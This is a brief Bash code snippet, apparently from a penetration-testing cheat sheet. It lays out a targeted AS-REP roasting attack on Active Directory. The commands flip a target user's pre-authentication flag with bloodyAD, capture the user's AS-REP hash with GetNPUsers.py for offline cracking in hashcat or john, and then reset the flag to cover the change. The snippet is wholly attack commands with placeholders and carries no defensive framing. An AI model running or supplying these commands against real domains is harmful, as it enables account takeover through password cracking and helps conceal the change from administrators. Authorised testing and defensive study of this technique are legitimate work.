---
id: c6688ce4-97fa-4279-a1e4-84f526ddfbb6
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:56:06.701353+00:00'
updated_at: '2023-04-10T20:26:07.519848+00:00'
---

# Code Snippet c6688ce4

**Language**: Bash

```bash
# Modify the userAccountControl
$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 True

# Grab the ticket
$ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# Set back the userAccountControl
$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 False
```


